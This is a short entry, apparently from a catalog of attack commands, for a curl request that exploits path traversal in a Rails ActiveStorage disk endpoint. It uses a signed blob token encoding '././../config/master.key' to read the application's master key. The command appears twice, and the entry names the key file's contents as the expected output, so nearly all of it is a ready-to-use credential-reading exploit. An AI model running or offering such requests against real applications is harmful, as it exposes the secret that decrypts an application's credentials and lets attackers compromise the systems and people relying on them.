---
data: >-
  curl
  "http://0.0.0.0:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLy4vLi4vY29uZmlnL21hc3Rlci5rZXkiLCJkaXNwb3NpdGlvbiI6ImlubGluZSIsImNvbnRlbnRfdHlwZSI6InRleHQvcGxhaW4iLCJzZXJ2aWNlX25hbWUiOiJkaXNrIn0sInB1ciI6ImJsb2Jfa2V5In19--73bb9947997d2e2377b31f2bedd0a056f58deff7/test"
tags:
  - curl
  - traversal
type: command
output: Contents of config/master.key
executor: bash
platforms:
  - Linux
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:26:22.358Z'
id: f839b0e4-514a-480f-b25f-16cb397c8203
verified: false
validated: true
submitted: true
---
# curl-read-traversal

## Command

```bash
curl "http://0.0.0.0:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLy4vLi4vY29uZmlnL21hc3Rlci5rZXkiLCJkaXNwb3NpdGlvbiI6ImlubGluZSIsImNvbnRlbnRfdHlwZSI6InRleHQvcGxhaW4iLCJzZXJ2aWNlX25hbWUiOiJkaXNrIn0sInB1ciI6ImJsb2Jfa2V5In19--73bb9947997d2e2377b31f2bedd0a056f58deff7/test"
```

## Description

Fetch arbitrary file via path traversal using signed blob URL.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Signed endpoint | Yes |

## Examples

### Basic Usage

```bash
curl "http://0.0.0.0:3000/rails/active_storage/disk/.../test"
```

## Expected Output

[Contents of master.key file]

## Related

- [[commands/curl-write-traversal]]
